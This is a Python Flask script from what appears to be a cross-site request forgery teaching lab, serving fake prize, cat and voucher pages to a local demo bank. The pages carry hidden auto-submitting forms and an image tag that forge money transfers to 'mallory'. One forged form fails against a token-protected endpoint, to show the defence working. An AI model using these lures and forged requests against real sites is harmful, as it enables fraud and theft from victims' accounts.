"""
attacker.py  -  the malicious site, on a different origin from the bank.

This is what an attacker controls. It is a completely separate web server, on a
different port, with no access to the bank's cookies or its CSRF token. All it
does is get the victim's browser to fire a request at the bank. The browser
attaches the bank cookie by itself, and that is the whole attack.

Run alongside the bank:  python3 attacker.py   (serves on port 5004)
"""

from flask import Flask, Response

app = Flask(__name__)
BANK = "http://127.0.0.1:5003"

LURE_POST = """
<!doctype html><html><head><meta charset="utf-8"><title>You won!</title>
<style>body{font-family:system-ui;background:#10131a;color:#fff;text-align:center;
padding:80px 20px}h1{font-size:34px}.p{color:#ffd66b;font-size:22px;margin:20px}
.b{background:#2b2f3a;display:inline-block;padding:18px 30px;border-radius:12px;
margin-top:10px;color:#9aa4b2;font-size:13px}</style></head><body>
<h1>Congratulations!</h1>
<div class="p">You have won a free trip to Paro Taktsang.</div>
<p>Setting up your reward, please wait...</p>
<div class="b">totally-legit-prizes.example</div>

<!-- The real payload: a hidden form aimed at the bank. The victim's browser
     will attach the bank's login cookie automatically. -->
<form id="f" action="%BANK%/transfer" method="POST" style="display:none">
  <input name="to" value="mallory">
  <input name="amount" value="50000">
</form>
<script>
  // auto-submit after a moment so the lure is visible first
  setTimeout(function(){ document.getElementById('f').submit(); }, 1200);
</script>
</body></html>
""".replace("%BANK%", BANK)

LURE_GET = """
<!doctype html><html><head><meta charset="utf-8"><title>Cute cat</title>
<style>body{font-family:system-ui;background:#10131a;color:#fff;text-align:center;
padding:70px 20px}h1{font-size:30px}.b{background:#2b2f3a;display:inline-block;
padding:16px 26px;border-radius:12px;margin-top:16px;color:#9aa4b2;font-size:13px}</style>
</head><body>
<h1>Look at this cat</h1>
<p>Loading image...</p>
<!-- A GET based CSRF. The bank accepts GET for transfers, so simply loading an
     image element at the transfer URL moves the money. No form, no script. -->
<img src="%BANK%/transfer?to=mallory&amount=10000" width="1" height="1" alt="">
<div class="b">cute-cats.example</div>
</body></html>
""".replace("%BANK%", BANK)


@app.route("/")
def post_attack():
    return Response(LURE_POST, mimetype="text/html")


LURE_SECURE = """
<!doctype html><html><head><meta charset="utf-8"><title>Free voucher</title>
<style>body{font-family:system-ui;background:#10131a;color:#fff;text-align:center;
padding:80px 20px}h1{font-size:30px}.b{background:#2b2f3a;display:inline-block;
padding:16px 26px;border-radius:12px;margin-top:16px;color:#9aa4b2;font-size:13px}</style>
</head><body>
<h1>Claim your voucher</h1>
<p>Processing...</p>
<!-- This forged form aims at the SECURE endpoint, but the attacker has no way
     to know the victim's CSRF token, so it is left out. The bank rejects it. -->
<form id="f" action="%BANK%/secure/transfer" method="POST" style="display:none">
  <input name="to" value="mallory"><input name="amount" value="50000">
</form>
<div class="b">free-vouchers.example</div>
<script>setTimeout(function(){document.getElementById('f').submit();},1200);</script>
</body></html>
""".replace("%BANK%", BANK)


@app.route("/cat")
def get_attack():
    return Response(LURE_GET, mimetype="text/html")


@app.route("/secure-attack")
def secure_attack():
    return Response(LURE_SECURE, mimetype="text/html")


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5004, debug=False)
